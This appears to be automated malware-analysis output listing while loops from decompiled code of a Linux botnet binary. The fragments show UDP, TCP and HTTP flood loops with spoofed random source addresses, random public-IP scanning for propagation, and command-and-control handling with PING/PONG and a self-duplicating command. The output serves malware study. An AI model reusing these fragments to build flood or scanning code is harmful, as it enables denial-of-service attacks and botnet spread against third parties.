=============================WHILE LOOPS ID : 17 @ readUntil ====================================
++++++++ WHILE START : 10213 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 10312 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t v204 = __libc_recv(a1, v203, 1, 0); // 0x10002d48
		if (strstr(a6, (char *)a2, v203) != 0) {
		int32_t v208 = __libc_recv(a1, v203 + 1, 2, 0); // 0x10002db8
=============================WHILE LOOPS ID : 18 @ GetRandomPublicIP ====================================
++++++++ WHILE START : 10518 
++++++++ WHILE FUNCTION : GetRandomPublicIP 
++++++++ WHILE END : 10728 
++++++++ INTRESTING INSTRUCTIONS :  
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
		szprintf(v203, (int32_t)"%d.%d.%d.%d", v198);
		return inet_addr(v203);
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
		v192 = random() % 223;
		v193 = random() % 255;
		v194 = random() % 255;
		v195 = random() % 255;
=============================WHILE LOOPS ID : 20 @ StartTheLelz ====================================
++++++++ WHILE START : 12370 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 12447 
++++++++ INTRESTING INSTRUCTIONS :  
		GetRandomPublicIP(v209);
		socket(2, 1, 0);
		if (__libc_connect(*v213, (int32_t)&v196, 16) == -1) {
=============================WHILE LOOPS ID : 25 @ sendSTD ====================================
++++++++ WHILE START : 12706 
++++++++ WHILE FUNCTION : sendSTD 
++++++++ WHILE END : 12729 
++++++++ INTRESTING INSTRUCTIONS :  
		random();
		__libc_send(v196, v207, 65, 0);
		__libc_connect(v196, v200, 16);
		__libc_close(v196);
=============================WHILE LOOPS ID : 26 @ sendHTTP ====================================
++++++++ WHILE START : 12941 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 12994 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v200 = random() % 36; // 0x10004bc4
		sprintf(v198, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2, v201, (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36", v200);
		if (__libc_fork() != 0) {
		while (true) {
		int32_t v203 = socket_connect(a2, a3, v196); // 0x10004c40
		__libc_close(v203);
=============================WHILE LOOPS ID : 27 @ sendUDP ====================================
++++++++ WHILE START : 13232 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13274 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v200, v201, a5, 0, v196, 16, v196);
		rand_cmwc();
=============================WHILE LOOPS ID : 28 @ sendUDP ====================================
++++++++ WHILE START : 13334 
++++++++ WHILE FUNCTION : sendUDP 
++++++++ WHILE END : 13389 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_sendto(v207, v212, a5 + 28, 0, v196, 16, v196);
		*v213 = (int16_t)rand_cmwc();
		v228 = rand_cmwc();
		*(int16_t *)(v212 | 4) = (int16_t)rand_cmwc();
		*(int32_t *)(v212 | 12) = htonl(GetRandomIP(v210));
=============================WHILE LOOPS ID : 29 @ sendTCP ====================================
++++++++ WHILE START : 13672 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13756 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v223, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v223, (int32_t)"psh") == 0) {
		Rootsprintf(v198, (int32_t)"Invalid flag \"%s\"", v222);
=============================WHILE LOOPS ID : 30 @ sendTCP ====================================
++++++++ WHILE START : 13781 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13811 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v197, v203, v201, 0, v195, 16, v195);
		v212 = GetRandomIP(v200);
		*(int16_t *)(v203 | 4) = (int16_t)rand_cmwc();
		*v209 = rand_cmwc();
		*v205 = (int16_t)rand_cmwc();
		*v216 = (int16_t)tcpcsum(v203, v215, v204);
=============================WHILE LOOPS ID : 31 @ sendTCP ====================================
++++++++ WHILE START : 13838 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 13854 
++++++++ INTRESTING INSTRUCTIONS :  
		__libc_sendto(v197, v203, v201, 0, v195, 16, v195);
		v212 = GetRandomIP(v200);
		*(int16_t *)(v203 | 4) = (int16_t)rand_cmwc();
		*v209 = rand_cmwc();
		*v205 = (int16_t)rand_cmwc();
		*v216 = (int16_t)tcpcsum(v203, v215, v204);
=============================WHILE LOOPS ID : 33 @ processCmd ====================================
++++++++ WHILE START : 14308 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14314 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 36 @ processCmd ====================================
++++++++ WHILE START : 14439 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14456 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendTCP(v196, v239, v240, v241, v242, v198, v199);
=============================WHILE LOOPS ID : 37 @ processCmd ====================================
++++++++ WHILE START : 14489 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14524 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v272 = __libc_getpid(); // 0x10006574
		v270 = kill(v273, 9);
=============================WHILE LOOPS ID : 38 @ processCmd ====================================
++++++++ WHILE START : 14536 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14553 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendSTD(v250, v256, v257);
=============================WHILE LOOPS ID : 43 @ processCmd ====================================
++++++++ WHILE START : 14672 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14678 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 46 @ processCmd ====================================
++++++++ WHILE START : 14744 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14761 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v197, v227, v228, v229, v230, v201, v200);
=============================WHILE LOOPS ID : 47 @ processCmd ====================================
++++++++ WHILE START : 14870 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14876 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 49 @ processCmd ====================================
++++++++ WHILE START : 14929 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 14935 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 53 @ processCmd ====================================
++++++++ WHILE START : 15043 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15049 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 56 @ processCmd ====================================
++++++++ WHILE START : 15101 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15107 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 57 @ processCmd ====================================
++++++++ WHILE START : 15198 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15204 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 59 @ processCmd ====================================
++++++++ WHILE START : 15251 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15257 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 63 @ processCmd ====================================
++++++++ WHILE START : 15353 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15359 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 66 @ processCmd ====================================
++++++++ WHILE START : 15557 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15563 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 68 @ processCmd ====================================
++++++++ WHILE START : 15610 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15616 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 71 @ processCmd ====================================
++++++++ WHILE START : 15698 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15704 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 72 @ processCmd ====================================
++++++++ WHILE START : 15724 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15730 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 73 @ processCmd ====================================
++++++++ WHILE START : 15834 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15840 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 74 @ processCmd ====================================
++++++++ WHILE START : 15873 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15879 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 75 @ processCmd ====================================
++++++++ WHILE START : 15930 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15936 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 76 @ processCmd ====================================
++++++++ WHILE START : 15956 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 15962 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 77 @ processCmd ====================================
++++++++ WHILE START : 16053 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16059 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 78 @ processCmd ====================================
++++++++ WHILE START : 16092 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16098 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 79 @ processCmd ====================================
++++++++ WHILE START : 16149 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16155 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 80 @ processCmd ====================================
++++++++ WHILE START : 16351 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16357 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 81 @ processCmd ====================================
++++++++ WHILE START : 16390 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16396 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 82 @ processCmd ====================================
++++++++ WHILE START : 16447 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16453 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 83 @ processCmd ====================================
++++++++ WHILE START : 16473 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16479 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 84 @ processCmd ====================================
++++++++ WHILE START : 16583 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16589 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 85 @ processCmd ====================================
++++++++ WHILE START : 16622 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16628 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 86 @ processCmd ====================================
++++++++ WHILE START : 16679 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16685 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 87 @ processCmd ====================================
++++++++ WHILE START : 16705 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16711 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 88 @ processCmd ====================================
++++++++ WHILE START : 16799 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16805 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 89 @ processCmd ====================================
++++++++ WHILE START : 16838 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16844 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 90 @ processCmd ====================================
++++++++ WHILE START : 16893 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 16899 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 91 @ processCmd ====================================
++++++++ WHILE START : 17060 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17066 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 92 @ processCmd ====================================
++++++++ WHILE START : 17099 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17105 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 93 @ processCmd ====================================
++++++++ WHILE START : 17154 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17160 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 94 @ processCmd ====================================
++++++++ WHILE START : 17180 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17186 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 95 @ processCmd ====================================
++++++++ WHILE START : 17284 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17290 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 96 @ processCmd ====================================
++++++++ WHILE START : 17323 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17329 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 97 @ processCmd ====================================
++++++++ WHILE START : 17378 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17384 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 98 @ processCmd ====================================
++++++++ WHILE START : 17404 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17410 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 99 @ processCmd ====================================
++++++++ WHILE START : 17495 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17501 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 100 @ processCmd ====================================
++++++++ WHILE START : 17534 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17540 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 101 @ processCmd ====================================
++++++++ WHILE START : 17589 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17595 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 102 @ processCmd ====================================
++++++++ WHILE START : 17780 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17786 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 103 @ processCmd ====================================
++++++++ WHILE START : 17804 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17810 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 104 @ processCmd ====================================
++++++++ WHILE START : 17908 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17914 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 105 @ processCmd ====================================
++++++++ WHILE START : 17932 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 17938 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 106 @ processCmd ====================================
++++++++ WHILE START : 18023 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18029 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 107 @ processCmd ====================================
++++++++ WHILE START : 18188 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18194 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 108 @ processCmd ====================================
++++++++ WHILE START : 18212 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18218 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 109 @ processCmd ====================================
++++++++ WHILE START : 18316 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18322 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 110 @ processCmd ====================================
++++++++ WHILE START : 18340 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18346 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 111 @ processCmd ====================================
++++++++ WHILE START : 18431 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 18437 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
=============================WHILE LOOPS ID : 112 @ getOurIP ====================================
++++++++ WHILE START : 18928 
++++++++ WHILE FUNCTION : getOurIP 
++++++++ WHILE END : 19035 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v204, 0x1000, v202) != 0) {
		if (strstr(v204, "\t00000000\t", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36") != 0) {
		__libc_close(v202);
		__libc_close(v196);
		__libc_close(v196);
		__libc_close(v202);
		__libc_close(v196);
		__libc_close(v196);
		__libc_close(v202);
		__libc_close(v196);
		__libc_close(v196);
=============================WHILE LOOPS ID : 113 @ main ====================================
++++++++ WHILE START : 19493 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19932 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		fgets(v214, 1024, v191);
		if (__GI_strcasecmp(v214, v213) == 0) {
		__GI_fclose((int16_t *)v191);
		int32_t v219 = __GI_fopen((int32_t)v192, (int32_t)&v218); // 0x10006d20
		__GI_fclose((int16_t *)v219);
		getOurIP();
		v200 = __libc_fork();
		if (__libc_fork() == 0) {
		zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
		while (true) {
		if (initConnection() != 0) {
		while (true) {
		if (initConnection() == 0) {
		v225 = __GI_inet_ntoa(&v224, 0x10020000);
		getBuild();
		Rootsprintf(v222, (int32_t)&v220, v225);
		while (true) {
		while (true) {
		if (recvLine(v194, (char *)&v195, 0x1000, v204) == -1) {
		while (true) {
		if (__libc_waitpid(v233, 0, 1) >= 1) {
		while (true) {
		while (true) {
		free();
		if (strstr(v204, "PING", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36") == v204) {
		Rootsprintf(v194, (int32_t)"PONG", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
		if (strstr(v204, "LELIMDUP", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36") == v204) {
		zprintf((int32_t)"PEACE OUT IMMA DUP\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
		while (true) {
		if (initConnection() == 0) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		if (listFork() == 0) {
		while (true) {
		processCmd(v258, &v210);
		processCmd(v258, &v210);
		while (true) {
		free();
		free();
		while (true) {
		if (__libc_waitpid(v233, 0, 1) < 1) {
		v225 = __GI_inet_ntoa(&v224, 0x10020000);
		getBuild();
		Rootsprintf(v222, (int32_t)&v220, v225);
		__libc_waitpid(v200, (int32_t)&v197, 0);
		zprintf((int32_t)"fork failed\n", (int32_t)"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36");
		while (true) {
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 115 @ main ====================================
++++++++ WHILE START : 19969 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19975 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 116 @ main ====================================
++++++++ WHILE START : 19992 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 19998 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 117 @ main ====================================
++++++++ WHILE START : 20023 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 20029 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 118 @ main ====================================
++++++++ WHILE START : 20046 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 20052 
++++++++ INTRESTING INSTRUCTIONS :  
		if (initConnection() == 0) {
=============================WHILE LOOPS ID : 119 @ main ====================================
++++++++ WHILE START : 20059 
++++++++ WHILE FUNCTION : main 
++++++++ WHILE END : 20076 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fdgets(v202, 1024, v267) == 0) {
		fdpclose(v267);
		Rootsprintf(v194, (int32_t)"%s", v202);
=============================WHILE LOOPS ID : 124 @ _vfprintf_internal ====================================
++++++++ WHILE START : 29630 
++++++++ WHILE FUNCTION : _vfprintf_internal 
++++++++ WHILE END : 30317 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 127 @ _ppfs_parsespec ====================================
++++++++ WHILE START : 31595 
++++++++ WHILE FUNCTION : _ppfs_parsespec 
++++++++ WHILE END : 32410 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 129 @ _stdio_openlist_dec_use ====================================
++++++++ WHILE START : 33300 
++++++++ WHILE FUNCTION : _stdio_openlist_dec_use 
++++++++ WHILE END : 33328 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
=============================WHILE LOOPS ID : 132 @ __GI_fgets_unlocked ====================================
++++++++ WHILE START : 33877 
++++++++ WHILE FUNCTION : __GI_fgets_unlocked 
++++++++ WHILE END : 33946 
++++++++ INTRESTING INSTRUCTIONS :  
		char v203 = getc_unlocked((int16_t *)a3, v199); // 0x10009b98
=============================WHILE LOOPS ID : 146 @ strstr ====================================
++++++++ WHILE START : 37072 
++++++++ WHILE FUNCTION : strstr 
++++++++ WHILE END : 37135 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 154 @ gethostbyname_r ====================================
++++++++ WHILE START : 41370 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 41401 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 155 @ gethostbyname_r ====================================
++++++++ WHILE START : 41511 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 41542 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 156 @ gethostbyname_r ====================================
++++++++ WHILE START : 41646 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 41677 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 157 @ gethostbyname_r ====================================
++++++++ WHILE START : 41779 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 41815 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 158 @ gethostbyname_r ====================================
++++++++ WHILE START : 41924 
++++++++ WHILE FUNCTION : gethostbyname_r 
++++++++ WHILE END : 41958 
++++++++ INTRESTING INSTRUCTIONS :  
		free();
		free();
		free();
=============================WHILE LOOPS ID : 162 @ srandom_r ====================================
++++++++ WHILE START : 48699 
++++++++ WHILE FUNCTION : srandom_r 
++++++++ WHILE END : 48740 
++++++++ INTRESTING INSTRUCTIONS :  
		__GI_random_r((int32_t *)v198, (int32_t)&v199);
		__GI_random_r((int32_t *)v198, (int32_t)&v199);
=============================WHILE LOOPS ID : 163 @ _stdlib_strto_l ====================================
++++++++ WHILE START : 49600 
++++++++ WHILE FUNCTION : _stdlib_strto_l 
++++++++ WHILE END : 49869 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 168 @ __stdio_WRITE ====================================
++++++++ WHILE START : 55800 
++++++++ WHILE FUNCTION : __stdio_WRITE 
++++++++ WHILE END : 55885 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 171 @ _fpmaxtostr ====================================
++++++++ WHILE START : 57570 
++++++++ WHILE FUNCTION : _fpmaxtostr 
++++++++ WHILE END : 61245 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 179 @ __GI_strpbrk ====================================
++++++++ WHILE START : 63382 
++++++++ WHILE FUNCTION : __GI_strpbrk 
++++++++ WHILE END : 63412 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 180 @ inet_aton ====================================
++++++++ WHILE START : 63622 
++++++++ WHILE FUNCTION : inet_aton 
++++++++ WHILE END : 63695 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 181 @ __dns_lookup ====================================
++++++++ WHILE START : 63933 
++++++++ WHILE FUNCTION : __dns_lookup 
++++++++ WHILE END : 64560 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		__libc_close(v210);
		if (inet_pton(10, (char *)v220, (int32_t)&v221) < 1) {
		inet_addr(v220);
		int32_t v224 = socket((int32_t)v223, 2, 17); // 0x1000dc1c
		if (__libc_connect(v207, 28, 28) > -1) {
		__libc_send(v194, v191, result + v227, 0);
		int32_t v228 = __libc_recv(v194, v191, 512, 0); // 0x1000dc9c
		__libc_close(v196);
		free();
		free();
		while (true) {
		__libc_close(v194);
		free();
		free();
		free();
		free();
		free();
		free();
		__libc_close(v194);
		free();
		free();
		free();
		__libc_close(v194);
		free();
		free();
		free();
		__libc_close(v194);
		free();
		free();
		free();
		__libc_close(v194);
		free();
		free();
		free();
		__libc_close(v194);
		free();
		free();
		free();
		free();
		__libc_close(v196);
		free();
		free();
		__libc_close(v196);
		free();
		free();
		__libc_close(v196);
		free();
		free();
=============================WHILE LOOPS ID : 182 @ __open_nameservers ====================================
++++++++ WHILE START : 64891 
++++++++ WHILE FUNCTION : __open_nameservers 
++++++++ WHILE END : 65089 
++++++++ INTRESTING INSTRUCTIONS :  
		if (fgets(v200, 128, v196) == 0) {
		__GI_fclose((int16_t *)v195);
		while (true) {
